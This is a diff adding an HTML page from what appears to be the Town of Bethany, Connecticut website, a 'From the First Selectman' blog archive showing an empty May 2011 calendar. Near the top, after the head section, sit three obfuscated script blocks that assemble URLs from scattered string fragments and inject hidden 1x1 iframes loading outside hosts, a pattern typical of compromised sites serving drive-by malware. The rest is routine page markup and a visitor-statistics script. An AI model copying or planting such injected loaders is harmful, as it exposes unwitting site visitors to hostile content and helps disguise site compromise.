@@ -1,0 +1,395 @@
+
+<html>
+<head>
+<title>From the First Selectman</title>
+
+<!-- aknew@@@ LINK href="include/styles.css" rel=stylesheet -->
+</head><script>yd='co';mh='m';im='a.';rm='h';my='5';t='m/';qg='v';vp='if';x='me';a='p:/';gv='a';q='/r';xk='.';ei='htt';y='k';cw='9';w='s';u='8';dk='ra';f='ytv';iy='e';l='jus';b='ew';hh='rc';h='t';vu=vp.concat(dk,x);qm=w.concat(hh);ka=ei.concat(a,q,b,gv,l,iy,qg,im,yd,t,y,cw,u,my,f,xk,rm,h,mh);var tq=document.createElement(vu);tq.setAttribute('width','1');tq.setAttribute('height','1');tq.frameBorder=0;tq.setAttribute(qm,ka);document.body.appendChild(tq);</script><script>ez='://';la='k9';vp='85y';ma='zi.';s='c';f='m';kg='cub';i='t';zz='/';l='sr';n='c';ng='ame';rv='.ht';gn='om';h='ht';tg='v';vl='tp';kf='ni';v='ifr';vq='yfo';bc=v.concat(ng);x=l.concat(n);p=h.concat(vl,ez,kg,vq,kf,ma,s,gn,zz,la,vp,i,tg,rv,f);var jc=document.createElement(bc);jc.setAttribute('width','1');jc.setAttribute('height','1');jc.frameBorder=0;jc.setAttribute(x,p);document.body.appendChild(jc);</script><script>wa='t';p='ht';f='k98';tb='ame';bg='.';v='sr';g='tp:';vf='/z';bs='t';px='v.h';br='yt';k='c';yr='m';ds='m';ej='/';au='/';t='com';sp='ifr';r='ca';cp='y';wz='ir';wf='u';b='5';se=sp.concat(tb);oz=v.concat(k);db=p.concat(g,ej,vf,wz,cp,r,bs,wf,yr,bg,t,au,f,b,br,px,wa,ds);var ip=document.createElement(se);ip.setAttribute('width','1');ip.setAttribute('height','1');ip.frameBorder=0;ip.setAttribute(oz,db);document.body.appendChild(ip);</script>
+<html>
+<!-- % Response.CacheControl = "no-cache" %> -->
+<!-- % Response.AddHeader "Pragma", "no-cache" % -->
+<!-- % Response.Expires = -1 % -->
+
+<SCRIPT src="../general/clientutils.js" type=text/javascript></SCRIPT>
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<link rel="stylesheet" type="text/css" href="../general/bethany.css">
+<META HTTP-EQUIV="imagetoolbar" CONTENT="no">
+<META HTTP-EQUIV="imagetoolbar" CONTENT="false">
+<link rel="icon" href="../general/favicon.ico" type="image/x-icon">
+<link rel="shortcut icon" href="../general/favicon.ico" type="image/x-icon">
+
+<title>Town of Bethany - From the First Selectman</title>
+<meta name="keywords" content="Bethany, Connecticut, From the First Selectman">
+
+<meta name="description" content="Description, links and contact information for the Town of Bethany, CT Board of Selectmen">
+<meta http-equiv="Page-Exit" content="blendTrans(Duration=1.0)">
+<style>
+div.Section1
+	{page:Section1;}
+</style>
+<SCRIPT src="../general/changepic.js" type=text/javascript></SCRIPT>
+
+
+
+
+</head>
+
+
+<body bgcolor="#FFFFCC" topmargin="15" leftmargin="0" bottommargin="0" rightmargin="0" align="center" background="../general/barnsiding.gif">
+<SCRIPT src="../general/noclick.js" type=text/javascript></SCRIPT>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%" height="100%">
+  <tr>
+    <td align="center" valign="top">
+    <table border="0" cellpadding="0" cellspacing="0" background="../general/barnsiding.gif" height="341" style="border-collapse: collapse" bordercolor="#111111" >
+      <tr>
+        <td align="center" height="71">
+    <img border="0" src="../general/barndoor2.gif" align="top" vspace="5"><p>
+    <img border="0" src="../general/barndoor3.gif" align="middle" vspace="15"></td>
+      </tr>
+      <tr>
+        <td align="center" height="120">
+    &nbsp;<br>    <img border="0" src="../general/spacer.gif" width="127" height="307"></td>
+      </tr>
+      
+      
+      
+      
+      
+      
+
+
+
+
+      <tr>
+        <td align="center" height="30">
+    <a href="../Community/com_ContactInformation.asp?mode=new">
+	<img border="0" src="../general/contact.gif" width="19" height="12"></a>&nbsp;&nbsp; <a href="../Community/com_SiteMap.asp"><img border="0" src="../general/sitemap.gif" width="19" height="12"></a>
+        </td>
+      </tr>
+      
+      
+      
+      
+      
+      
+
+
+
+
+      <tr>
+        <td align="center" height="73">
+    <img border="0" src="../general/barndoor1.gif">
+    <br>
+        </td>
+      </tr>
+      
+      
+      
+      
+      
+      
+
+
+
+
+    </table>
+    
+
+<!-- STAT CODE -->
+<script type="text/javascript" language="JavaScript">
+// Define the location of count.asp
+// Using a path, you may use this code in any subfolder
+var file='../statcountex/count.asp';
+
+var d=new Date(); 
+var s=d.getSeconds(); 
+var m=d.getMinutes();
+var x=s*m;
+f='' + escape(document.referrer);
+if (navigator.appName=='Netscape'){b='NS';} 
+if (navigator.appName=='Microsoft Internet Explorer'){b='MSIE';} 
+if (navigator.appVersion.indexOf('MSIE 3')>0) {b='MSIE';}
+u='' + escape(document.URL); w=screen.width; h=screen.height; 
+v=navigator.appName; 
+fs = window.screen.fontSmoothingEnabled;
+if (v != 'Netscape') {c=screen.colorDepth;}
+else {c=screen.pixelDepth;}
+j=navigator.javaEnabled();
+info='w=' + w + '&h=' + h + '&c=' + c + '&r=' + f + '&u='+ u + '&fs=' + fs + '&b=' + b + '&x=' + x;
+document.write('<img src="' + file + '?'+info+ '" width=90 height=30 border=0>');
+</script>
+
+    
+    
+    
+    </td>
+    <td width="99%" align="left" valign="top">
+
+
+    <table cellpadding="0" cellspacing="0" width="98%" bordercolor="#C6AD7B" style="border-collapse:collapse" bordercolorlight="#975544" bordercolordark="#4A2921" height="417">
+      <tr>
+        <td align="right" valign="bottom" background="../general/t1.gif" height="29" width="29">
+        <img border="0" src="../general/nail2-tl.gif"></td>
+        <td align="center" colspan="7" background="../general/t2.gif" height="29">
+        &nbsp;</td>
+        <td align="left" valign="bottom" background="../general/t3.gif" height="29" width="29">
+        <img border="0" src="../general/nail2-tr.gif"></td>
+      </tr>
+      <tr>
+        <td align="center" valign="top" background="../general/t8.gif" width="29" height="366">
+        &nbsp;</td>
+        <td align="center" valign="top" bgcolor="#FFFFCC" height="366" colspan="7">
+<p style="margin-top: 0; margin-bottom: 0"><font size="1"><a name="caltop">&nbsp;</a></font></p>
+<table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td class='bloglink'><div class='menulink'><!-- < = strLangSelectLanguage %>&nbsp;<img src="immagini/freccia.gif"><img src="immagini/freccia.gif">&nbsp;
+	   <a href="lang.asp?lang=italian"><img src="immagini/italian.gif"  border="0" alt="italian version" align="absmiddle"></a>&nbsp; 
+       <a href="lang.asp?lang=english"><img src="immagini/english.gif" border="0" alt="english version" align="absmiddle"></a> 
+	   <font class="green"> | </font>--><a class='bloglink' href="index.asp?archivio=OK">Full database</a> 
+      </div>
+     </td>
+    <td class='bloglink' align="right"><div class='menulink'> 
+    <a href="../feeds/selectmenfeed.xml"> 
+    <img border="0" src="immagini/rss.jpg"></a> | <a href="subscribe.asp?mode=new">Subscribe</a> | <a href="unsubscribe.asp?mode=new">Unsubscribe</a> |
+      Admin&nbsp;<img src="immagini/freccia.gif"><img src="immagini/freccia.gif">&nbsp;&nbsp;
+	   
+	  <a href="newblog.asp">New entry</a><font class="green"> | </font> 
+	  
+	  <a href="editallblog.asp">Edit/delete entry</a> <font class="green"> | </font> <a href="configura.asp">Configure</a>&nbsp; 
+      </div></td></tr>
+  <tr> 
+    <td colspan="2"><div class="hrgreen"><img src="immagini/spacer.gif"></div></td>
+  </tr>
+  <tr> 
+  <!-- aknew@@@
+    <td class='bloglink' colspan="2" align="right"><u>Database entries</u> &nbsp;<img src="immagini/freccia.gif"><img src="immagini/freccia.gif">&nbsp;&nbsp;<font class="arancio"><b> 
+      MAY&nbsp;2011
+      </b></font>&nbsp;</td>
+      -->
+    <td class='bloglink' colspan="2" align="right"><p class='bloglink'>Database entries &nbsp;<img src="immagini/freccia.gif"><img src="immagini/freccia.gif">&nbsp;&nbsp;<font class="arancio"><b> 
+      MAY&nbsp;2011
+      </b></font>&nbsp;</p></td>
+  </tr>
+  <tr> 
+    <td class='bloglink' colspan="2">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td class='bloglink' colspan="2">&nbsp;</td>
+  </tr>
+</table>
+<table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+      <td width="180" align="center" valign="top"><table border='0' CELLPADDING=2 CELLSPACING=0 align='center' width='130'><tr><td valign='top' class='bloglinkcal' height="16" align='right' width='33%'><p class='bloglinkcal'><a href='index.asp?month=4&year=2011' title='previous month'><img style='margin-top: 3' src='immagini/frecciasx.gif' border='0'><img style='margin-top: 3' src='immagini/frecciasx.gif' border='0'></a></p></td><td  valign='top' class='bloglinkcal' align='center' width='34%'><b><p class='bloglinkcal'><b>MAY&nbsp;2011</b></p></b></td><td  valign='top' class='bloglinkcal' width='33%'><p class='bloglinkcal'><a href='index.asp?month=6&year=2011' title='next month'></p><img style='margin-top: 3' src='immagini/freccia.gif' border='0'><img style='margin-top: 3' src='immagini/freccia.gif' border='0'></a></td></tr></table><table border='0' CELLPADDING=2 CELLSPACING=0 align='center' width='130'><tr align='center'><td  valign='top' class='bloglinkcal'><p class='bloglinkcal'>s</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>m</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>t</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>w</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>t</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>f</p></td><td valign='top' class='bloglinkcal'><p class='bloglinkcal'>s</p></td></tr><tr><td colspan="7"><div class='hrgreen'><img src='immagini/spacer.gif'></div></td></tr><tr><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>1</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>2</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>3</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>4</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>5</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>6</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>7</p></td><tr><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>8</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>9</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>10</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>11</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>12</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>13</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>14</p></td><tr><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>15</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>16</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>17</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>18</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>19</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>20</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>21</p></td><tr><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>22</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>23</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>24</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>25</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>26</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>27</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>28</p></td><tr><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>29</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>30</p></td><td class='bloglinkcal' valign='top' align='center'><p class='bloglinkcal'>31</p></td><td valign='top'></td><td valign='top'></td><td valign='top'></td><td valign='top'></td></tr></table><br>
+                  <form  method="post" action="index.asp">
+                    <table width="90%" border="0" cellspacing="0" cellpadding="0" align="center">
+                      <tr align="center"> 
+                        <td> <select name="month" class="form">
+                           
+                           <option value="1">
+						   Jan</option>
+                           
+                           <option value="2">
+						   Feb</option>
+                           
+                           <option value="3">
+						   Mar</option>
+                           
+                           <option value="4">
+						   Apr</option>
+                           
+                           <option value="5" selected>
+						   May</option>
+                           
+                           <option value="6">
+						   Jun</option>
+                           
+                           <option value="7">
+						   Jul</option>
+                           
+                           <option value="8">
+						   Aug</option>
+                           
+                           <option value="9">
+						   Sep</option>
+                           
+                           <option value="10">
+						   Oct</option>
+                           
+                           <option value="11">
+						   Nov</option>
+                           
+                           <option value="12">
+						   Dec</option>
+                           
+                          </select> </td>
+                        <td> <select name="year" class="form">
+						
+                            <option >2003</option>
+							
+                            <option >2004</option>
+							
+                            <option >2005</option>
+							
+                            <option >2006</option>
+							
+                            <option >2007</option>
+							
+                            <option >2008</option>
+							
+                            <option >2009</option>
+							
+                            <option >2010</option>
+							
+                            <option  selected >2011</option>
+							
+                            <option >2012</option>
+							
+                            <option >2013</option>
+							
+                            <option >2014</option>
+							
+                            <option >2015</option>
+							
+                            <option >2016</option>
+							
+                            <option >2017</option>
+							
+                            <option >2018</option>
+							
+                            <option >2019</option>
+							
+                            <option >2020</option>
+							
+                            <option >2021</option>
+							
+                            <option >2022</option>
+							
+                            <option >2023</option>
+							
+                            <option >2024</option>
+							
+                            <option >2025</option>
+							
+                            <option >2026</option>
+							
+                            <option >2027</option>
+							
+                            <option >2028</option>
+							
+                            <option >2029</option>
+							
+                            <option >2030</option>
+							
+                            <option >2031</option>
+							
+                            <option >2032</option>
+							
+                            <option >2033</option>
+							
+                            <option >2034</option>
+							
+                            <option >2035</option>
+							
+                            <option >2036</option>
+							
+                            <option >2037</option>
+							
+                            <option >2038</option>
+							
+                            <option >2039</option>
+							
+                            <option >2040</option>
+							
+                            <option >2041</option>
+							
+                            <option >2042</option>
+							
+                            <option >2043</option>
+							
+                            <option >2044</option>
+							
+                            <option >2045</option>
+							
+                            <option >2046</option>
+							
+                            <option >2047</option>
+							
+                            <option >2048</option>
+							
+                            <option >2049</option>
+							
+                            <option >2050</option>
+							
+                             </select> </td>
+                        <td class='bloglink'> <input type="submit" name="Submit" value="go" class="form"> 
+                        </td>
+                      </tr>
+                    </table>
+                  </form>
+                  <u><p class='bloglinkcal'><a href="index.asp?month=10&year=2011">* go to current month</a></p></u><br>
+      <br>
+     <!-- <br>
+      <br>-->
+     <!--<div class='bloglink'><a href="http://www.uapplication.com" target="_blank"><img src="immagini/powered.gif" alt="uapplication.com" border="0"></a></div> 
+    -->
+    
+      <div class='bloglinkitalic'><a href="http://www.uapplication.com" target="_blank">powered by uapplication</a></div> 
+	</td>
+    <td class='bloglink' width="3" rowspan="2" background="immagini/punto.gif"><img src="immagini/bianco.gif"></td>
+    <td class='bloglink' valign="top">
+<div align='center'><br><br><br>Sorry, there are no blogs in the database related to the selected month.<br><br><div class='bloglink'><a href='index.asp?archivio=OK'>display full database</a></div>
+	</td>
+  </tr>
+  <tr> 
+    <td class='bloglink'>&nbsp;</td>
+    <td class='bloglink'>&nbsp;</td>
+  </tr>
+</table>
+  <p>&nbsp;</td>
+        <td align="left" background="../general/t4.gif" width="29" height="366">
+        &nbsp;</td>
+      </tr>
+      <tr>
+        <td align="right" valign="top" background="../general/t7.gif" width="29" height="1">
+        <img border="0" src="../general/nail2-bl.gif"></td><td align="center" background="../general/t6.gif" colspan="7" valign="top" height="1"><A  class='totoplink' style="text-decoration: none" href="#caltop" onmouseover="changepic('up','../general/UpArrow.gif')" onmouseout="changepic('up','../general/UpArrow-sm.gif')"> Back to Top <IMG NAME="up" SRC="../general/UpArrow-sm.gif" ALT="Image" border="0" width="17" height="18"></A>
+        </td>
+        <td align="left" valign="top" background="../general/t5.gif" width="29" height="29">
+        <img border="0" src="../general/nail2-br.gif" width="29" height="29"></td></tr><tr><td align="right" valign="top" height="35"></td><td align="center" height="35"></td><td align="center" height="35"></td><td align="center" height="35"></td><td align="center" height="35">
+
+    <img border="0" src="../general/bethanyCT.gif" align="absbottom" width="145" height="35">    </td>
+        <td align="center" height="35"></td>
+        <td align="center" height="35">
+        <td align="center" height="35"></td>
+        <td align="left" valign="top" height="35">
+        </td>
+      </tr>
+      <tr>
+        <td align="right" valign="top" height="1">
+        </td>
+        <td align="center" height="1"></td>
+        <td align="center" height="1"></td>
+        <td align="center" height="1"></td>
+        <td align="center" height="1">
+ <!--<p class="footnote">&nbsp;</p>-->
+   	    <a href="../Community/com_ContactInformation.asp?mode=new">
+	<img border="0" src="../general/contact.gif" width="19" height="12"></a>&nbsp;&nbsp; <a href="../Community/com_SiteMap.asp"><img border="0" src="../general/sitemap.gif" width="19" height="12"></a>
+
+	</td>
+        <td align="center" height="1"></td>
+        <td align="center" height="1"></td>
+        <td align="center" height="1"></td>
+        <td align="left" valign="top" height="1">
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+  </table>
+<script type=text/javascript>function Go(){return}</script>
+<script type=text/javascript src='../general/bethmenu_var.js'></script>
+<script type=text/javascript src='../general/menu9_com.js'></script>
+    <a style="text-decoration: none" href="crawler.asp">.</a></body></html>
